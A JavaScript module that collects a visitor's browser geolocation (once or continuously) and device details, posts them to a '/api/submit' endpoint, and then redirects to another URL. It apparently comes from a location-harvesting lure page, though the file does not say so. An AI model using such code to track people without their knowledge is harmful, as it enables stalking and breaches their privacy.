/**
 * Data Collection and Reporting Module
 */
const DataCollector = {
    /**
     * Initialize data collection
     * @param {string} mode - 'single' or 'watch' geolocation mode
     * @param {string} redirectUrl - URL to redirect after successful location gathering (optional)
     * @param {Function} onSuccess - Callback for when location is successfully gathered (optional)
     * @param {Function} onError - Callback for when there's an error getting location (optional)
     */
    initialize: function(mode, redirectUrl, onSuccess, onError) {
        // Store configuration
        this.mode = mode || 'single';
        this.redirectUrl = redirectUrl || '';
        this.onSuccessCallback = onSuccess;
        this.onErrorCallback = onError;
        
        // Collect device info immediately
        this.deviceInfo = DeviceInfo.collect();
        
        // Set up submission queue for watch mode
        this.submissionQueue = [];
        this.lastSubmissionTime = 0;
        this.submissionInterval = 10000; // 10 seconds between submissions in watch mode
        
        // Start location gathering
        this.gatherLocation();
    },
    
    /**
     * Gather location based on configured mode
     */
    gatherLocation: function() {
        GeoLocation.getLocation(
            this.mode,
            (position) => this.handleLocationSuccess(position),
            (error) => this.handleLocationError(error)
        );
    },
    
    /**
     * Handle successful location gathering
     * @param {Object} position - Geolocation position object
     */
    handleLocationSuccess: function(position) {
        // Format position data
        const positionData = GeoLocation.formatPositionData(position);
        
        // Merge with device info
        const data = {...this.deviceInfo, ...positionData};
        
        // Submit data or queue for submission
        if (this.mode === 'watch') {
            this.queueSubmission(data);
        } else {
            this.submitData(data);
        }
        
        // Call success callback if provided
        if (typeof this.onSuccessCallback === 'function') {
            this.onSuccessCallback(position);
        }
        
        // Redirect if URL is provided (for single mode only)
        if (this.redirectUrl && this.mode === 'single') {
            setTimeout(() => {
                window.location.href = this.redirectUrl;
            }, 300);
        }
    },
    
    /**
     * Handle location gathering error
     * @param {Object} error - Geolocation error object
     */
    handleLocationError: function(error) {
        // Format error data
        const errorData = GeoLocation.formatErrorData(error);
        
        // Merge with device info
        const data = {...this.deviceInfo, ...errorData};
        
        // Submit error data
        this.submitData(data);
        
        // Call error callback if provided
        if (typeof this.onErrorCallback === 'function') {
            this.onErrorCallback(error);
        }
    },
    
    /**
     * Queue data for submission (used in watch mode)
     * @param {Object} data - Data to be submitted
     */
    queueSubmission: function(data) {
        this.submissionQueue.push(data);
        
        // Check if it's time to submit
        const now = Date.now();
        if (now - this.lastSubmissionTime >= this.submissionInterval) {
            this.processQueue();
        }
    },
    
    /**
     * Process submission queue
     */
    processQueue: function() {
        if (this.submissionQueue.length === 0) return;
        
        // Submit the latest data point
        const latestData = this.submissionQueue[this.submissionQueue.length - 1];
        this.submitData(latestData);
        
        // Clear the queue
        this.submissionQueue = [];
        this.lastSubmissionTime = Date.now();
    },
    
    /**
     * Submit data to the server
     * @param {Object} data - Data to submit
     */
    submitData: function(data) {
        fetch('/api/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        }).catch(error => {
            console.error('Error submitting data:', error);
        });
    },
    
    /**
     * Stop data collection (important for watch mode)
     */
    stop: function() {
        // Clear geolocation watch
        GeoLocation.clearWatch();
        
        // Process any remaining data in the queue
        this.processQueue();
    }
};

// Set up automatic cleanup when page is unloaded
window.addEventListener('beforeunload', function() {
    DataCollector.stop();
});